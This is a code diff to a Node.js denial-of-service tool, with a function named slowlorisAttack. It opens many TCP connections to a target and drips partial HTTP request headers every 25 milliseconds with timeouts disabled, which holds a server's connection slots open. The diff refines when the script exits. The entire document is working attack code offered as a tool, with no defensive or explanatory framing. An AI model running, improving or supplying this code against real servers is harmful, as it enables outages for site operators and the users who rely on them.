@@ -33,7 +33,7 @@ function slowlorisAttack() {
       req = createRequest()
 
       for(let i = 0; i < connections; i++) {
-        sendRequest(req, port)
+        sendRequest(req, port, (i == connections-1))
       }
 
       printWhileSending()
@@ -53,29 +53,36 @@ function createRequest() {
   return req
 }
 
-function sendRequest(req, port) {
-   const connection = net.connect(port, host, function(){
-    activeConnections++
-    console.log('Started connection')
-    console.log('Active connections: ' + activeConnections)
+function sendRequest(req, port, finalReq) {
+ const connection = net.connect(port, host, function(){
+  activeConnections++
+  console.log('Active connections: ' + activeConnections)
 
-    connection.write('GET / HTTP/1.1\r\n')
+  connection.write('GET / HTTP/1.1\r\n')
 
-    let i = 0;
-    setInterval(function(){
-      if (!req[i]) {
-        return
-      } else {
-        connection.write(req[i])
-        i++
+  let i = 0;
+  setInterval(function(){
+    if (!req[i]) {
+      return
+    } else {
+      connection.write(req[i])
+      i++
+      if (i == req.length && finalReq) {
+        console.log('----Finished final request----')
+        process.exit(0)
       }
-    }, 25)
-  })
+    }
+  }, 25)
+})
 
-  connection.setTimeout(0)
+ connection.setTimeout(0)
 
-  connection.on('error', () => {
-    console.log('Closed connection')
-    activeConnections--
-  })
+ connection.on('error', () => {
+  activeConnections--
+  if (activeConnections <= 0) {
+    console.log('')
+    console.log('----All connections closed-----')
+    process.exit(0)
+  }
+})
 }
